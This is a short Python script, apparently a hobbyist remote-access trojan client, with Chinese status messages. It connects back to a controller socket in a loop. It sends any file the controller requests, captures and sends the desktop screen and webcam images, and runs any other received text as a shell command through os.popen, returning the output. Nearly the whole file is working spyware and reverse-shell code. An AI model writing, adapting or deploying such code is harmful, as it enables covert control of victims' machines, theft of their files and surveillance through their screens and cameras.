import socket,os,time
from PIL import ImageGrab
from VideoCapture import Device


while True:
    try:
        print('正在连接...')
        HOST, PORT = '127.0.0.1', 9999
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        
    except:
        print('connect...')
        continue
        
    while True:
        try:    
            recv_data = str(sock.recv(1024), "utf-8")
        except:
            print('服务器连接不上！')
            break
        if recv_data == 'hello':
            continue
        if not recv_data:
            continue
        if recv_data.split()[0] == 'get':
            f_name = recv_data.split()[1]
            print(f_name)
            f = open(f_name,'rb')
            
            sock.sendall(f.read())
            
            time.sleep(1)

            sock.send(b'stop')
            continue
        if recv_data == 'ImageGrab':
            im = ImageGrab.grab()
            im = im.resize((1024,768))
            sock.sendall(im.tostring())
            time.sleep(1)
            sock.send(b'stop')
            print('桌面截图发送成功！')
            continue
        if recv_data == 'CamImage':
            print(1)
            cam = Device()
            im = cam.getImage()
            im = im.resize((320,240))
            sock.sendall(im.tostring())
            time.sleep(1)
            sock.send(b'stop')
            print('摄像头截图发送成功！')
            continue
        #print(recv_data)
        cmd_result = os.popen(recv_data).read()
        if cmd_result == '':
            cmd_result = 'NOT'
        print (cmd_result)
        sock.sendall(bytes(cmd_result,'utf-8'))
    sock.close()
